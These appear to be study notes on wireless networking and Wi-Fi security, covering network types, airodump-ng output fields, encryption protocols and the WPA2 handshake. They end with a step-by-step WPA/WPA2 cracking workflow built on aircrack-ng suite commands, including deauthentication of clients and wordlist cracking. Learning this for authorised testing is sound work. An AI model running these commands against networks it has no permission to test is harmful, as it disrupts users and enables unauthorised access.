Wireless networking refers to communication between devices **without physical cables**, using **radio waves, infrared, or satellite signals**. It enables connectivity for personal, local, metropolitan, and wide areas.

* **Key Idea**: Transmits data over the air using **electromagnetic waves**.
* **Standards**: Mostly based on the **IEEE 802.11 family** (Wi-Fi).
* **Advantages**: Mobility, flexibility, ease of deployment.
* **Limitations**: Susceptible to interference, limited range, and security risks.

## **Types of Wireless Networks**

### 1. **WPAN (Wireless Personal Area Network)**

* Covers devices within **\~30 ft** (Bluetooth, ZigBee, etc.).

### 2. **WLAN / WCAN (Wireless Local/Client Area Network)**

* Used for **local area connectivity** (home, office, hotspot).
* Created using a **single AP** or **multiple APs** for extended coverage.
* Based on **IEEE 802.11 standards**.

### 3. **WMAN (Wireless Metropolitan Area Network)**

* Covers **networks across metropolitan areas**.
* Technologies: **Proprietary, IEEE 802.16, WiMAX**.
* Used over **cities/countries** via satellite or antenna systems.
* Supports **2G, 3G, 4G, 5G**.

### **Applications**

* Internet access (Wi-Fi hotspots, home networks).
* Mobile communication (2G → 5G).
* IoT devices (smart homes, sensors).
* Enterprise & public infrastructure (offices, campuses, transport).


## **Wi-Fi Analysis Parameters (e.g., `airodump-ng`)**

### **Access Point (AP) Fields**

* **BSSID** → MAC address of AP.
* **PWR** → Signal strength.
* **Beacons** → Count of AP announcement packets.
* **RXQ** → Receive Quality (% packets successfully received).
* **CH** → Channel number.
* **MB** → Max supported speed.
* **ENC** → Encryption type (WEP, WPA, WPA2).
* **CIPHER** → Cipher used (CCMP, TKIP, WEP, etc.).
* **AUTH** → Authentication protocol (PSK, MGT).
* **ESSID** → Wireless network name.

### **Client/Station Fields**

* **STATION** → MAC address of client.
* **# Data** → Captured data packets.
* **#/s** → Packet rate per second.
* **Lost** → Packets lost in last 10 sec.
* **Packets** → Data sent by client.
* **Probes** → Networks probed by client.

## **Wireless NIC Modes**

1. **Managed Mode** → Connects to AP like a normal client.
2. **Promiscuous Mode** → Captures all packets (not only its own).
3. **Monitor Mode** → Sniffs wireless traffic (needed for pentesting).


## **Wi-Fi Encryption Protocols**

### **WEP (Wired Equivalent Privacy)**

* Oldest Wi-Fi encryption (broken).
* Uses **RC4 + IV (Initialization Vector)**.
* IV sent in plaintext → leads to key recovery attacks.
* Integrity check via **CRC-32**.

### **WPA (Wi-Fi Protected Access)**

* Replaced WEP.
* Uses **PSK authentication** + **TKIP encryption**.
* Features: Authentication, Encryption, Integrity.
* Weakness: Still vulnerable due to TKIP design.

### **WPA2**

* Mandatory **AES-CCMP** encryption.
* Stronger than WPA.
* Authentication via **4-Way Handshake**.

**Handshake Process (simplified):**

1. AP → sends nonce to client.
2. Client → derives PTK (using AP nonce + MACs + PSK).
3. Client → sends its own nonce + MIC to AP.
4. Both derive session keys (PTK → KCK, KEK, TK).


## **Supporting Keys & Protocols**

* **TKIP** → Rotates keys dynamically.
* **PTK (Pairwise Temporal Key)** components:

  * **KCK** → Integrity (128-bit).
  * **KEK** → Key distribution (128-bit).
  * **TK** → Data encryption (128-bit).
  * **MIC Keys** → Authentication (64-bit each).

## **Authentication Methods**

1. **Open Authentication** → No checks, relies on key match.
2. **Shared Key Authentication** → Challenge-response, insecure.
3. **MAC Address Filtering** → Based on client MAC (bypassable).
4. **EAP (Extensible Authentication Protocol)** → Advanced (certs, tokens).


## **Deauthentication Attacks**

* Used to **force a client offline** (even on WPA2).
* Works by **spoofing deauth frames** pretending to be AP or client.
* Forces re-authentication → attacker can capture handshake.

## **WPA/WPA2 Cracking Workflow**

1. **Check and Enable Monitor Mode**
   ```bash
   ifconfig wlan0 down
   iwconfig wlan0 mode Monitor
   ifconfig wlan0 up
   ```
   ```
   iwconfig
   ```
   ```
   airmon-ng start wlan0
   ```

2. **Scan Networks**

   ```bash
   airodump-ng wlan0
   ```

3. **Target Specific AP**

   ```bash
   airodump-ng wlan0 --channel <ch> --bssid <AP_MAC> --write capture
   ```

4. **Deauth Clients (to capture handshake)**

   ```bash
   aireplay-ng --deauth 5 -a <AP_MAC> wlan0
   ```

5. **Crack Handshake**

   ```bash
   aircrack-ng capture-01.cap -w wordlist.txt
   ```

### **Useful Tools & Commands**

* `lsusb` → List USB devices (check Wi-Fi adapter).
* `iwconfig` → Check wireless interface mode.
* `airmon-ng check kill` → Kill conflicting processes.
* `aireplay-ng -9 wlan0` → Test packet injection capability.

### **Attack Modes (aireplay-ng)**

* **--deauth** → Disconnect clients.
* **--fakeauth** → Fake auth with AP.
* **--interactive** → Manual injection.
* **--arpreplay** → Standard ARP replay attack.
* **--chopchop** → WEP-specific chopchop attack.
